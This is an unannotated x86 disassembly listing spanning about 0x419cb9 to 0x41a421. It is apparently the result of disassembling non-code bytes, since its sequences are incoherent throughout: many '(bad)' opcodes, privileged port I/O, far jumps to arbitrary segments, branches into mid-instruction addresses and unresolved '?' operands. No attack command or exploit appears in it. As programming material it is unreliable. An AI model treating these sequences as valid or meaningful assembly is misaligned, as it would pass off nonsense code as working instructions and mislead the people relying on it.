  419cb9:	test   BYTE PTR [edx],0x95
  419cbc:	das    
  419cbd:	in     eax,dx
  419cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cbf:	mov    cs,esi
  419cc1:	xor    WORD PTR fs:[eax],0xa695
  419cc7:	pop    esi
  419cc8:	hlt    
  419cc9:	pop    ds
  419cca:	inc    ecx
  419ccb:	test   BYTE PTR [ebx+0x3a50671],ah
  419cd1:	loope  0x419d49
  419cd3:	cdq    
  419cd4:	push   cs
  419cd5:	sbb    edx,DWORD PTR [ebp-0x347baec9]
  419cdb:	aaa    
  419cdc:	pop    ebp
  419cdd:	lods   eax,DWORD PTR ds:[esi]
  419cde:	dec    edx
  419cdf:	fucomi st,st(6)
  419ce1:	jl     0x419cdd
  419ce3:	pop    esi
  419ce4:	(bad)
  419ce7:	jb     0x419d06
  419ce9:	sub    BYTE PTR [eax],bh
  419ceb:	retf   0xc36c
  419cee:	adc    eax,0x1ff53229
  419cf3:	stc    
  419cf4:	stos   BYTE PTR es:[edi],al
  419cf5:	xchg   BYTE PTR [ebx-0x37],ch
  419cf8:	xchg   BYTE PTR [eax-0x73],dl
  419cfb:	fdivrp st(2),st
  419cfd:	fstp   QWORD PTR [esi+0xd3d8479]
  419d03:	repnz pop ecx
  419d05:	not    al
  419d07:	xchg   ecx,eax
  419d08:	jbe    0x419d00
  419d0a:	loopne 0x419d59
  419d0c:	fidiv  WORD PTR [ebp-0x7d85d661]
  419d12:	or     BYTE PTR [edi],0x38
  419d15:	in     al,0xf8
  419d17:	test   DWORD PTR [eax-0x644572b0],0x794bfa5a
  419d21:	add    cl,bl
  419d23:	lds    esi,FWORD PTR ds:0xeb1c51ec
  419d29:	out    0x31,al
  419d2b:	sub    BYTE PTR [edx+0x57],al
  419d2e:	mov    ebp,0xbc30b770
  419d33:	pushf  
  419d34:	sbb    eax,0xcbe8080
  419d39:	or     al,0xc2
  419d3b:	pop    es
  419d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3d:	jecxz  0x419cee
  419d3f:	pushf  
  419d40:	sub    BYTE PTR [edx+0x29],al
  419d43:	xchg   DWORD PTR [ebx+0x1a],edx
  419d46:	push   edi
  419d47:	sub    esi,esp
  419d49:	mov    ecx,0xc2966b07
  419d4e:	adc    eax,0x90244ea3
  419d53:	pop    ebp
  419d54:	mov    edi,0xb8200b44
  419d59:	adc    al,BYTE PTR [edi-0x110e418b]
  419d5f:	jg     0x419d1e
  419d61:	add    al,0x7c
  419d63:	sbb    BYTE PTR [ecx+0x49],bh
  419d66:	inc    edx
  419d67:	out    0x6b,al
  419d69:	xor    al,0xa
  419d6b:	jle    0x419d8f
  419d6d:	lods   al,BYTE PTR ds:[esi]
  419d6e:	inc    esp
  419d6f:	js     0x419dd4
  419d71:	mov    edi,0x824aa70d
  419d76:	fwait
  419d77:	and    BYTE PTR [edx+0x71495d0d],dh
  419d7d:	mov    cl,0x2
  419d7f:	imul   edx,ecx,0x9fbe88a
  419d85:	dec    edx
  419d86:	dec    edx
  419d87:	icebp  
  419d88:	cmc    
  419d89:	popa   
  419d8a:	bound  esp,QWORD PTR ds:0x8ea0a14d
  419d90:	fistp  DWORD PTR [ebp-0x21]
  419d93:	imul   esi,DWORD PTR [ecx-0x7c8b4dd1],0xffffffcf
  419d9a:	xchg   ebx,eax
  419d9b:	push   ds
  419d9c:	dec    esp
  419d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d9e:	int3   
  419d9f:	jg     0x419d76
  419da1:	mov    al,cs:0xc0aac430
  419da7:	sbb    eax,0x9f30df7
  419dac:	pop    ebx
  419dad:	lds    esi,FWORD PTR [edi-0x225cd4c0]
  419db3:	dec    eax
  419db4:	add    esi,ebp
  419db6:	sti    
  419db7:	sub    eax,ebp
  419db9:	lods   al,BYTE PTR ds:[esi]
  419dba:	mov    dl,0x10
  419dbc:	mov    dh,0x70
  419dbe:	test   al,0x55
  419dc0:	pushf  
  419dc1:	or     edi,DWORD PTR [ebx-0x68]
  419dc4:	(bad)  
  419dc5:	(bad)  
  419dc6:	shr    BYTE PTR [ecx],1
  419dc8:	pop    eax
  419dc9:	push   DWORD PTR [ebp+0x4]
  419dcc:	out    dx,al
  419dcd:	or     ecx,DWORD PTR [esi-0x4f]
  419dd0:	xchg   ebp,eax
  419dd1:	xchg   edx,eax
  419dd2:	test   al,0x4b
  419dd4:	std    
  419dd5:	cmp    BYTE PTR [eax-0x79d8b78c],dh
  419ddb:	rol    BYTE PTR [ecx+0x49],0x4b
  419ddf:	sar    BYTE PTR [ecx-0x4c],0x76
  419de3:	or     eax,0xbd5d61bf
  419de8:	sbb    eax,0x4cefd835
  419ded:	pop    ss
  419dee:	in     eax,dx
  419def:	push   ss
  419df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419df1:	imul   edi,DWORD PTR [eax-0x7ba6edbb],0xffffffb8
  419df8:	add    ch,BYTE PTR [edx]
  419dfa:	(bad)  
  419dfb:	in     al,dx
  419dfc:	(bad)  
  419dfd:	mov    ch,0x42
  419dff:	cmp    al,0xd8
  419e01:	push   0x142f5eb9
  419e06:	outs   dx,DWORD PTR ds:[esi]
  419e07:	scas   eax,DWORD PTR es:[edi]
  419e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e09:	test   BYTE PTR [ebx-0x6006c604],bh
  419e0f:	xor    DWORD PTR [eax+0x42],ecx
  419e12:	ret    
  419e13:	jne    0x419da5
  419e15:	mov    DWORD PTR [ebp-0x155892a5],ecx
  419e1b:	dec    ecx
  419e1c:	sub    al,0xd9
  419e1e:	xchg   edx,eax
  419e1f:	loopne 0x419e17
  419e21:	jle    0x419e62
  419e23:	mov    al,al
  419e25:	mov    DWORD PTR [ebx],ecx
  419e27:	jl     0x419e2c
  419e29:	add    DWORD PTR [ecx],ecx
  419e2b:	adc    ebx,ecx
  419e2d:	inc    ecx
  419e2e:	mov    ecx,0xd28ddce3
  419e33:	or     bh,BYTE PTR ds:0xc730fe41
  419e39:	pop    eax
  419e3a:	add    al,0x2d
  419e3c:	fstp   QWORD PTR [eax]
  419e3e:	fwait
  419e3f:	cmp    BYTE PTR [eax-0x36],ah
  419e42:	push   es
  419e43:	jg     0x419e42
  419e45:	sub    eax,0x8794bf45
  419e4a:	adc    DWORD PTR [edx+0x11],esi
  419e4d:	lock sub al,0x2d
  419e50:	fdivr  st(5),st
  419e52:	cmc    
  419e53:	scas   eax,DWORD PTR es:[edi]
  419e54:	dec    ebx
  419e55:	out    0x78,eax
  419e57:	pop    ebp
  419e58:	xchg   ecx,eax
  419e59:	xchg   DWORD PTR [ecx],ebx
  419e5b:	rcl    bl,cl
  419e5d:	pop    esp
  419e5e:	imul   ebp,DWORD PTR [esi-0x7c1bc8e2],0xffffffc9
  419e65:	pop    esp
  419e66:	ins    DWORD PTR es:[edi],dx
  419e67:	sbb    ch,BYTE PTR [ebp+0x6af84631]
  419e6d:	sub    BYTE PTR [edi+0x7c6ca39a],cl
  419e73:	xor    al,0x6d
  419e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e76:	mov    DWORD PTR [eax+eiz*2+0x10d481c],esp
  419e7d:	jns    0x419ebb
  419e7f:	std    
  419e80:	fstp   st(0)
  419e82:	stc    
  419e83:	bound  ecx,QWORD PTR [ecx]
  419e85:	fistp  WORD PTR [edx+0x266e994f]
  419e8b:	inc    edx
  419e8c:	push   esp
  419e8d:	std    
  419e8e:	jecxz  0x419e86
  419e90:	adc    esi,DWORD PTR [edx]
  419e92:	push   ds
  419e93:	in     eax,dx
  419e94:	sbb    eax,0x3492ac7a
  419e99:	add    DWORD PTR [esi],esp
  419e9b:	in     al,dx
  419e9c:	sub    ch,BYTE PTR [edx]
  419e9e:	sbb    bh,BYTE PTR [eax]
  419ea0:	jg     0x419e69
  419ea2:	in     al,0x7c
  419ea4:	js     0x419e9c
  419ea6:	stos   DWORD PTR es:[edi],eax
  419ea7:	push   edx
  419ea8:	loop   0x419f15
  419eaa:	std    
  419eab:	inc    esi
  419eac:	aad    0x64
  419eae:	xor    eax,0x53297110
  419eb3:	in     eax,0x9c
  419eb5:	inc    eax
  419eb6:	mov    DWORD PTR [esp+ecx*1],0xcdafd6c4
  419ebd:	add    DWORD PTR [ebp-0x62],edi
  419ec0:	lahf   
  419ec1:	cs push edx
  419ec3:	hlt    
  419ec4:	mov    eax,0x2220cce3
  419ec9:	jae    0x419ef8
  419ecb:	das    
  419ecc:	and    esp,esp
  419ece:	dec    esp
  419ecf:	out    dx,al
  419ed0:	pop    ss
  419ed1:	pop    ds
  419ed2:	inc    esp
  419ed3:	stc    
  419ed4:	arpl   WORD PTR [ecx],cx
  419ed6:	push   esp
  419ed7:	dec    edi
  419ed8:	aaa    
  419ed9:	(bad)  
  419eda:	gs adc edi,ebx
  419edd:	popf   
  419ede:	sbb    al,0x95
  419ee0:	popa   
  419ee1:	lods   eax,DWORD PTR fs:[esi]
  419ee3:	xchg   esi,eax
  419ee4:	scas   al,BYTE PTR es:[edi]
  419ee5:	les    esp,FWORD PTR [ebp+ebx*2+0x1f]
  419ee9:	xchg   ebp,eax
  419eea:	sbb    DWORD PTR [ebp-0x72e787dd],edx
  419ef0:	pop    eax
  419ef1:	scas   eax,DWORD PTR es:[edi]
  419ef2:	fisttp WORD PTR [ebx+0x2470dd4b]
  419ef8:	ror    BYTE PTR [ecx-0x2],cl
  419efb:	or     DWORD PTR [edi-0x56d3cf97],0xfffffffc
  419f02:	xor    esp,DWORD PTR [esi+esi*4+0x17]
  419f06:	leave  
  419f07:	ror    BYTE PTR [esi+0x23],0x74
  419f0b:	dec    esi
  419f0c:	les    eax,FWORD PTR [eax+0x1c226382]
  419f12:	push   ebp
  419f13:	add    ah,BYTE PTR [ebp+0x641ca7fa]
  419f19:	popa   
  419f1a:	sbb    esp,DWORD PTR [ebx+0x5cae2b73]
  419f20:	ss dec eax
  419f22:	ins    DWORD PTR es:[edi],dx
  419f23:	loope  0x419ec7
  419f25:	push   ebx
  419f26:	dec    edx
  419f27:	jl     0x419f4b
  419f29:	push   0x9403a89
  419f2e:	sub    ah,bl
  419f30:	cmp    ch,BYTE PTR [ecx+0x25]
  419f33:	into   
  419f34:	call   0xe86e:0x26dfccc5
  419f3b:	test   al,0x1a
  419f3d:	fdivr  st(5),st
  419f3f:	add    eax,0x8b5de747
  419f44:	cmp    bl,BYTE PTR [ebp-0x371d1045]
  419f4a:	jmp    0xbc45:0xd63274bf
  419f51:	push   esp
  419f52:	adc    esi,ebx
  419f54:	dec    edi
  419f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f56:	dec    eax
  419f57:	jg     0x419fd3
  419f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f5a:	addr16 cli 
  419f5c:	dec    eax
  419f5d:	inc    ebx
  419f5e:	call   0x3614:0x65473dc8
  419f65:	or     dh,bl
  419f67:	jp     0x419f40
  419f69:	nop
  419f6a:	das    
  419f6b:	xchg   DWORD PTR [ebp+0x286ad99a],eax
  419f71:	push   edx
  419f72:	call   0x968ad6f0
  419f77:	stc    
  419f78:	cmp    BYTE PTR [ecx+0x7bbbb949],ah
  419f7e:	sbb    DWORD PTR [eax-0x7be6fb18],edx
  419f84:	jle    0x419f50
  419f86:	add    BYTE PTR [eax-0x23],ch
  419f89:	adc    DWORD PTR [eax+0x220a5e94],esp
  419f8f:	sbb    bl,ah
  419f91:	ret    0x64c3
  419f94:	fdivr  DWORD PTR [ecx+ebx*2+0x58]
  419f98:	fild   WORD PTR [edx]
  419f9a:	push   edi
  419f9b:	add    ebp,DWORD PTR [ebx+0x18]
  419f9e:	and    al,BYTE PTR [esp+0x1e3c328d]
  419fa5:	adc    al,0xff
  419fa7:	scas   eax,DWORD PTR es:[edi]
  419fa8:	inc    edi
  419fa9:	xlat   BYTE PTR ds:[ebx]
  419faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fab:	in     al,0x6d
  419fad:	dec    ebp
  419fae:	cmp    eax,esi
  419fb0:	adc    DWORD PTR [edi-0x6b02026e],ecx
  419fb6:	mov    dl,BYTE PTR [ecx+eiz*1]
  419fb9:	ret    
  419fba:	jmp    0xa77a02e6
  419fbf:	arpl   WORD PTR [edx-0x2142711b],cx
  419fc5:	add    al,0x85
  419fc7:	xchg   esp,eax
  419fc8:	mov    esp,0x2fea416e
  419fcd:	xlat   BYTE PTR ds:[ebx]
  419fce:	jns    0x419fc2
  419fd0:	rcr    ebp,0x87
  419fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fd4:	scas   eax,DWORD PTR es:[edi]
  419fd5:	pop    eax
  419fd6:	push   eax
  419fd7:	sbb    ebx,esi
  419fd9:	adc    ebx,DWORD PTR [eax+0x353aa8c3]
  419fdf:	inc    eax
  419fe0:	pushf  
  419fe1:	nop
  419fe2:	frstor [edx]
  419fe4:	(bad)  
  419fe5:	ror    ebp,cl
  419fe7:	push   ebx
  419fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fe9:	or     edx,DWORD PTR [esi+0xd]
  419fec:	imul   ebp,DWORD PTR [edx+0x3ead25e3],0x8dae84c6
  419ff6:	xor    bh,BYTE PTR [edx+0x7a63c61f]
  419ffc:	fst    QWORD PTR [ebp+0x77]
  419fff:	gs push ds
  41a001:	aad    0x7c
  41a003:	xchg   ecx,eax
  41a004:	mov    esp,0xbacf8539
  41a009:	test   dh,dh
  41a00b:	and    al,0x35
  41a00d:	mov    cl,0x2d
  41a00f:	xlat   BYTE PTR ds:[ebx]
  41a010:	outs   dx,BYTE PTR ds:[esi]
  41a011:	xchg   ebp,eax
  41a012:	cld    
  41a013:	imul   ecx,esp,0x42
  41a016:	and    ebp,DWORD PTR [eax]
  41a018:	xor    DWORD PTR [edi+0x79],esp
  41a01b:	loope  0x419fa2
  41a01d:	cs xchg ecx,eax
  41a01f:	xchg   ebp,eax
  41a020:	fisub  DWORD PTR [edi]
  41a022:	dec    esi
  41a023:	inc    ebx
  41a024:	ret    
  41a025:	fsubr  DWORD PTR [eax-0x73]
  41a028:	mov    ?,WORD PTR [ebx]
  41a02a:	jmp    0x90c1:0xb01a167c
  41a031:	je     0x419ff2
  41a033:	mov    BYTE PTR [esi],ah
  41a035:	push   esi
  41a036:	in     eax,dx
  41a037:	dec    ecx
  41a038:	outs   dx,BYTE PTR ds:[esi]
  41a039:	pop    esi
  41a03a:	fs cmp ah,ah
  41a03d:	jge    0x41a093
  41a03f:	adc    DWORD PTR [ebp-0x7f],0xffffffc5
  41a043:	adc    al,bh
  41a045:	add    BYTE PTR [ecx],dh
  41a047:	xor    eax,0xc875baab
  41a04c:	aaa    
  41a04d:	retf   0xc289
  41a050:	aad    0x3f
  41a052:	or     BYTE PTR [ecx-0x13],cl
  41a055:	pop    eax
  41a056:	cmp    ah,dl
  41a058:	mov    ch,0xda
  41a05a:	or     eax,0xb697ba5d
  41a05f:	cs dec esi
  41a061:	cmp    ecx,esi
  41a063:	inc    ebp
  41a064:	sahf   
  41a065:	and    al,0xe6
  41a067:	scas   eax,DWORD PTR es:[edi]
  41a068:	push   edx
  41a069:	call   0xe4f59b26
  41a06e:	pextrw esi,(bad),0xc5
  41a070:	mov    bl,0xe9
  41a072:	sbb    eax,DWORD PTR [ecx]
  41a074:	and    BYTE PTR [ebp-0x44807a91],dl
  41a07a:	inc    esi
  41a07b:	push   es
  41a07c:	lods   al,BYTE PTR ds:[esi]
  41a07d:	aad    0xef
  41a07f:	jecxz  0x41a0ab
  41a081:	ja     0x41a033
  41a083:	xor    BYTE PTR [ebp-0x17],0xaf
  41a087:	test   eax,0x7e7a9d5d
  41a08c:	jne    0x41a0eb
  41a08e:	call   esp
  41a090:	cld    
  41a091:	jg     0x41a01f
  41a093:	push   eax
  41a094:	(bad)  [esi+0x71]
  41a097:	fucom  st(6)
  41a099:	mov    gs,WORD PTR [edi+0x13319d3d]
  41a09f:	adc    eax,0xd0e24fd7
  41a0a4:	enter  0x984e,0xc4
  41a0a8:	ficomp DWORD PTR [edi+esi*8]
  41a0ab:	call   0xbc71:0xc5e627d8
  41a0b2:	ret    0xb114
  41a0b5:	(bad)  
  41a0b6:	pop    es
  41a0b7:	nop
  41a0b8:	pop    ss
  41a0b9:	mov    dh,0x22
  41a0bb:	mov    edi,0xb767e97a
  41a0c0:	jb     0x41a0a6
  41a0c2:	(bad)  
  41a0c3:	iret   
  41a0c4:	cmp    BYTE PTR [ebp-0x21],bl
  41a0c7:	dec    esi
  41a0c8:	sbb    DWORD PTR [ebx+0x77],esi
  41a0cb:	pusha  
  41a0cc:	dec    edi
  41a0cd:	jo     0x41a0bb
  41a0cf:	(bad)  [esp+ecx*8]
  41a0d2:	xlat   BYTE PTR ds:[ebx]
  41a0d3:	out    dx,al
  41a0d4:	out    0x7c,al
  41a0d6:	setl   BYTE PTR [edx+0x3ea88954]
  41a0dd:	imul   edi,DWORD PTR [esi],0x89ce7268
  41a0e3:	sbb    cl,bh
  41a0e5:	inc    esp
  41a0e6:	sbb    BYTE PTR [esp+edi*4-0x2b68125c],ch
  41a0ed:	xor    eax,0x91925065
  41a0f2:	outs   dx,DWORD PTR ds:[esi]
  41a0f3:	pop    es
  41a0f4:	fsub   DWORD PTR gs:[ecx+0x3b]
  41a0f8:	outs   dx,DWORD PTR ds:[esi]
  41a0f9:	xlat   BYTE PTR ds:[ebx]
  41a0fa:	imul   esi,DWORD PTR [esi+0x44],0xfffffff0
  41a0fe:	add    BYTE PTR [eax],bl
  41a100:	jmp    0xb193f835
  41a105:	pop    ss
  41a106:	xchg   ebp,eax
  41a107:	js     0x41a0d3
  41a109:	push   0xc7c55b2f
  41a10e:	test   al,0x51
  41a110:	xor    BYTE PTR [esi],0xda
  41a113:	lods   eax,DWORD PTR ds:[si]
  41a115:	ficomp WORD PTR [ebx+edx*1+0x1a]
  41a119:	add    cl,cl
  41a11b:	ins    BYTE PTR es:[edi],dx
  41a11c:	sahf   
  41a11d:	js     0x41a11d
  41a11f:	clc    
  41a120:	(bad)  
  41a122:	imul   edx,DWORD PTR [esp+edx*4-0xa1d7858],0xc4197c11
  41a12d:	sbb    eax,0x1a342d4f
  41a132:	test   eax,0x6b933447
  41a137:	jmp    0x41a1b4
  41a139:	inc    eax
  41a13a:	jnp    0x41a1ae
  41a13c:	xor    al,0x18
  41a13e:	inc    esi
  41a13f:	cmp    DWORD PTR ds:0xb5e0fde,eax
  41a145:	xor    bh,0x43
  41a148:	cmp    al,0x32
  41a14a:	mov    ebx,0x39552cfb
  41a14f:	stos   DWORD PTR es:[edi],eax
  41a150:	lods   al,BYTE PTR ds:[esi]
  41a151:	push   es
  41a152:	int3   
  41a153:	sbb    al,BYTE PTR [eax]
  41a155:	jo     0x41a18e
  41a157:	lds    esp,FWORD PTR [ebx]
  41a159:	loopne 0x41a1ae
  41a15b:	ficomp DWORD PTR [edx+0x316c1080]
  41a161:	sbb    eax,0xe33ba0be
  41a166:	pop    ds
  41a167:	jge    0x41a1ba
  41a169:	dec    ecx
  41a16a:	xchg   esi,eax
  41a16b:	sub    al,0xa2
  41a16d:	or     al,0xeb
  41a16f:	lahf   
  41a170:	xchg   ebx,eax
  41a171:	jmp    0x41a0f5
  41a173:	(bad)  
  41a174:	(bad)  
  41a175:	jnp    0x41a15a
  41a177:	or     DWORD PTR [ecx],ebp
  41a179:	or     esp,DWORD PTR [eax-0x49]
  41a17c:	lods   eax,DWORD PTR ds:[esi]
  41a17d:	into   
  41a17e:	outs   dx,DWORD PTR ds:[esi]
  41a17f:	repnz mov dh,BYTE PTR [eax-0x14]
  41a183:	sub    esi,esi
  41a185:	mov    eax,0xfe9c398f
  41a18a:	mov    edi,0xbf292f20
  41a18f:	cmp    al,0x6c
  41a191:	cdq    
  41a192:	arpl   WORD PTR [ecx+0x535d5169],bx
  41a198:	xchg   edx,eax
  41a199:	adc    eax,0xf13ecbd
  41a19e:	pop    ecx
  41a19f:	jno    0x41a1dd
  41a1a1:	pushf  
  41a1a2:	jns    0x41a204
  41a1a4:	clc    
  41a1a5:	sub    DWORD PTR [esi],ecx
  41a1a7:	outs   dx,DWORD PTR ds:[esi]
  41a1a8:	(bad)  
  41a1a9:	xchg   edx,eax
  41a1aa:	sar    ebx,cl
  41a1ac:	(bad)  
  41a1ae:	hlt    
  41a1af:	js     0x41a1ce
  41a1b1:	fst    st(3)
  41a1b3:	js     0x41a1f6
  41a1b5:	fisub  DWORD PTR [ebp-0x3f]
  41a1b8:	mov    eax,ds:0x2a31ed77
  41a1bd:	sahf   
  41a1be:	pop    esp
  41a1bf:	push   ss
  41a1c0:	sub    DWORD PTR [edi],eax
  41a1c2:	push   edi
  41a1c3:	or     dl,BYTE PTR [esi+0x759b93cb]
  41a1c9:	dec    edi
  41a1ca:	in     eax,dx
  41a1cb:	rcr    BYTE PTR [esi+0x984c7f9],cl
  41a1d1:	mul    al
  41a1d3:	push   eax
  41a1d4:	ss stc 
  41a1d6:	inc    edi
  41a1d7:	sbb    edi,DWORD PTR [eax-0x23d59bab]
  41a1dd:	inc    edx
  41a1de:	mov    gs,WORD PTR [ebx+0xe4cbfc6]
  41a1e4:	cli    
  41a1e5:	loop   0x41a216
  41a1e7:	mov    al,0xef
  41a1e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1ea:	or     BYTE PTR [edx+0x74afe91c],bh
  41a1f0:	pop    ds
  41a1f1:	add    ah,bl
  41a1f3:	jecxz  0x41a241
  41a1f5:	dec    esp
  41a1f6:	js     0x41a17d
  41a1f8:	test   eax,0xd69d31b2
  41a1fd:	js     0x41a21f
  41a1ff:	push   es
  41a200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a201:	pop    edx
  41a202:	leave  
  41a203:	test   BYTE PTR [ecx-0x62ce22d0],bh
  41a209:	add    DWORD PTR [ebx],esi
  41a20b:	jne    0x41a23c
  41a20d:	pusha  
  41a20e:	ss push ds
  41a210:	ficomp DWORD PTR [edx+0x4a2aab5a]
  41a216:	push   ds
  41a217:	and    ecx,DWORD PTR [esi+0x3cd2c435]
  41a21d:	dec    ebp
  41a21e:	adc    eax,0xecba1caa
  41a223:	dec    edx
  41a224:	push   es
  41a225:	adc    DWORD PTR [ecx*2+0x6b8c2ca1],0xd03ffc90
  41a230:	fimul  DWORD PTR [ebp+0x180805c2]
  41a236:	mov    ch,0x4a
  41a238:	loopne 0x41a2a1
  41a23a:	jle    0x41a294
  41a23c:	add    DWORD PTR [esi+ebp*1],esp
  41a23f:	push   es
  41a240:	pop    esi
  41a241:	cmp    ah,BYTE PTR [eax]
  41a243:	cdq    
  41a244:	push   ebp
  41a245:	pop    edx
  41a246:	rcl    DWORD PTR [eax+0x6b],1
  41a249:	push   ds
  41a24a:	mov    ch,0xb9
  41a24c:	call   0xba3f356f
  41a251:	or     dh,dl
  41a253:	gs add al,0xc1
  41a256:	or     dl,BYTE PTR [edx+0x26f5dfd9]
  41a25c:	lods   al,BYTE PTR ds:[esi]
  41a25d:	data16 das 
  41a25f:	pop    esi
  41a260:	sub    al,0x4f
  41a262:	mov    ebx,0xf902ceb6
  41a267:	push   0x762f36e2
  41a26c:	adc    al,0x9b
  41a26e:	adc    BYTE PTR [ebp+0x184a1841],ah
  41a274:	cdq    
  41a275:	mov    ah,0xff
  41a277:	or     dl,BYTE PTR [edx]
  41a279:	dec    edi
  41a27a:	shl    BYTE PTR [eax],cl
  41a27c:	imul   edi,edi,0xe08ad1de
  41a282:	xchg   ebp,eax
  41a283:	mov    DWORD PTR [esi*2+0x59965776],edi
  41a28a:	cdq    
  41a28b:	sbb    DWORD PTR ds:0xdf7a4458,edi
  41a291:	jle    0x41a301
  41a293:	sahf   
  41a294:	push   eax
  41a295:	aam    0xac
  41a297:	sbb    DWORD PTR ds:0xb7757395,edx
  41a29d:	neg    DWORD PTR [edi]
  41a29f:	stc    
  41a2a0:	and    dh,BYTE PTR [ecx+0x1d]
  41a2a3:	cmc    
  41a2a4:	test   ah,bh
  41a2a6:	cmp    eax,0x34e920f2
  41a2ab:	push   eax
  41a2ac:	cmc    
  41a2ad:	ret    
  41a2ae:	and    DWORD PTR [esp+eiz*4+0x5c8d6841],esp
  41a2b5:	add    BYTE PTR [ecx],ah
  41a2b7:	call   0x5c4f:0x6bfdf9b7
  41a2be:	lock jmp 0xc909:0xd16dbcc
  41a2c6:	(bad)  
  41a2c7:	sahf   
  41a2c8:	cld    
  41a2c9:	push   esi
  41a2ca:	add    esp,esi
  41a2cc:	in     al,dx
  41a2cd:	sub    al,0x8d
  41a2cf:	scas   al,BYTE PTR es:[edi]
  41a2d0:	sbb    BYTE PTR [edx],al
  41a2d2:	bnd ret 0x2804
  41a2d6:	xchg   edi,eax
  41a2d7:	mov    dl,0x65
  41a2d9:	jl     0x41a260
  41a2db:	cli    
  41a2dc:	stos   BYTE PTR es:[edi],al
  41a2dd:	test   BYTE PTR [ebx-0x78cd9c92],ch
  41a2e3:	nop
  41a2e4:	pop    ebp
  41a2e5:	dec    ebx
  41a2e6:	(bad)  
  41a2e7:	loopne 0x41a2fe
  41a2e9:	and    edx,DWORD PTR [ecx+0x50]
  41a2ec:	out    0x2e,eax
  41a2ee:	pop    edx
  41a2ef:	lds    ebx,FWORD PTR [ebx-0x61]
  41a2f2:	(bad)  
  41a2f3:	in     al,dx
  41a2f4:	retf   0x1e11
  41a2f7:	daa    
  41a2f8:	xchg   esp,eax
  41a2f9:	mov    cs,ecx
  41a2fb:	xor    al,0xb0
  41a2fd:	add    cl,bl
  41a2ff:	xlat   BYTE PTR ds:[ebx]
  41a300:	popf   
  41a301:	and    DWORD PTR [ebx-0x65],esi
  41a304:	inc    ecx
  41a305:	mov    WORD PTR [edi+0x6da212ab],?
  41a30b:	loope  0x41a309
  41a30d:	fcomi  st,st(0)
  41a30f:	into   
  41a310:	imul   BYTE PTR [edi-0x625bc01c]
  41a316:	jb     0x41a33f
  41a318:	test   eax,0xfbef206
  41a31d:	adc    BYTE PTR [edx+ecx*4+0x71100df1],dl
  41a324:	inc    esp
  41a325:	les    ebx,FWORD PTR [ebp+0x69ee650c]
  41a32b:	cmp    DWORD PTR [eax],edx
  41a32d:	daa    
  41a32e:	fistp  DWORD PTR [edi+0x703fb17f]
  41a334:	mov    bh,0x34
  41a336:	les    eax,FWORD PTR [ecx+0x5a]
  41a339:	cmp    BYTE PTR [ebx-0x5],dl
  41a33c:	shl    BYTE PTR [esi+0x56fe8c7a],1
  41a342:	inc    esp
  41a343:	fst    QWORD PTR [edi-0x60d57868]
  41a349:	scas   al,BYTE PTR es:[edi]
  41a34a:	jl     0x41a2ed
  41a34c:	mov    ecx,0xd231bc91
  41a351:	pop    ebp
  41a352:	(bad)  
  41a353:	inc    esp
  41a354:	jbe    0x41a3b2
  41a356:	xchg   ebx,eax
  41a357:	daa    
  41a358:	pop    ecx
  41a359:	leave  
  41a35a:	mov    dh,BYTE PTR [edx+0xc]
  41a35d:	and    esp,DWORD PTR [eax+0x73320088]
  41a363:	or     al,0xb8
  41a365:	aaa    
  41a366:	not    BYTE PTR [ecx+0x1e]
  41a369:	cld    
  41a36a:	inc    edi
  41a36b:	ja     0x41a3bb
  41a36d:	mov    edi,0xd86d60ce
  41a372:	mov    ds:0x2bd8850e,al
  41a377:	dec    ebx
  41a378:	rcr    DWORD PTR [edi-0x1c5680aa],1
  41a37e:	and    esp,esi
  41a380:	ror    cl,1
  41a382:	dec    ecx
  41a383:	jmp    0x41a3e0
  41a385:	out    dx,al
  41a386:	test   al,0xd2
  41a388:	lock cmp eax,0x2a0df468
  41a38e:	adc    BYTE PTR [ebx-0x43b687cb],ch
  41a394:	xchg   esi,eax
  41a395:	mov    ah,0xe6
  41a397:	cmp    BYTE PTR [edi-0x5ab1e030],al
  41a39d:	data16 js 0x41a336
  41a3a0:	xchg   ecx,eax
  41a3a1:	sbb    ebp,ebp
  41a3a3:	idiv   esp
  41a3a5:	lea    eax,[ecx+0x8ecdc80]
  41a3ab:	inc    BYTE PTR [edx+0x9]
  41a3ae:	fiadd  WORD PTR [ebp+0x287d7cac]
  41a3b4:	popa   
  41a3b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3b6:	mov    edi,0xf8b5a276
  41a3bb:	repz test eax,0xd7e2942a
  41a3c1:	push   edx
  41a3c2:	test   BYTE PTR [edx-0x73eae78b],cl
  41a3c8:	aaa    
  41a3c9:	sbb    eax,0x30d6c842
  41a3ce:	aad    0xe
  41a3d0:	call   0x126de4bb
  41a3d5:	xchg   edi,eax
  41a3d6:	cmp    ebp,ebx
  41a3d8:	jmp    0x5238:0x9b0a3416
  41a3df:	pop    esp
  41a3e0:	in     al,dx
  41a3e1:	mov    WORD PTR [edx+edx*8-0x2f],ss
  41a3e5:	call   0x41d3:0xde040813
  41a3ec:	sub    ecx,ecx
  41a3ee:	popf   
  41a3ef:	mov    esi,0xa598ea04
  41a3f4:	pop    ds
  41a3f5:	rcr    DWORD PTR [edx+ecx*1-0x4d3ae67],0x2
  41a3fd:	jns    0x41a393
  41a3ff:	popa   
  41a400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a401:	mov    eax,ds:0xfd8112ba
  41a406:	mov    eax,esi
  41a408:	imul   ebp,DWORD PTR [esi],0x909daac9
  41a40e:	icebp  
  41a40f:	jle    0x41a489
  41a411:	jp     0x41a3aa
  41a413:	popf   
  41a414:	(bad)  
  41a415:	cdq    
  41a416:	add    al,0xe9
  41a418:	(bad)  
  41a419:	sub    BYTE PTR [ecx-0x3d],bh
  41a41c:	mov    edi,0x4ce08d9a
  41a421:	push   ebp
